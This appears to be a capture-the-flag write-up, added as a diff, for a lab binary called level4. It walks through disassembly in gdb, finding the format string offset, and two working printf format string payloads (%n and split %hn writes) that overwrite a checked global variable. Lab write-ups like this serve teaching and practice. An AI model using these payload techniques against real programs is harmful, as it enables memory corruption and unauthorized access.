@@ -1,0 +1,39 @@
+Disassembling p, it appears that a call to printf is made :
+0x08048450 <+12>:    call   0x8048340 <printf@plt>
+
+Afterwards, eax is set to the content of 0x8049810 :
+0x0804848d <+54>:    mov    0x8049810,%eax
+
+A cmp is made between eax and 0x1025544 which is 16930116 in decimal.
+0x08048492 <+59>:    cmp    $0x1025544,%eax
+
+A format string exploit is then possible, the goal being to write the value 16930116 at 0x8049810 through printf.
+
+First, let's find the memory offset to write to :
+python -c  'print "A" * 30 + "%x " * 20' > /tmp/egg
+
+(gdb) r < /tmp/egg
+Starting program: /home/user/level4/level4 < /tmp/egg
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 41414141 
+41414141 41414141 41414141 41414141 41414141 41414141 78254141 20782520 
+
+The offset is 12.
+
+Exploit :
+
+python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" > /tmp/payload
+padd 16930112 bytes with white space at offset 12 at 0x8049810.
+
+An other way, quicker and cleaner :
+
+python -c "print '\x12\x98\x04\x08' + '\x10\x98\x04\x08' + '%250x%12\$hn' + '%21570x%13\$hn'" > /tmp/bla2
+
+We only write the first 4 and last 4 bytes at a time by using %h.
+'\x12\x98\x04\x08' is 0x8049810 + 2.
+0x0102 = 258 (decimal)
+0x5544 = 21828 
+258 - 8 = 250  (8 is the size of '\x12\x98\x04\x08' + '\x10\x98\x04\x08')
+21828 - 258 = 21570
+
+
+cat /tmp/payload - | ./level4
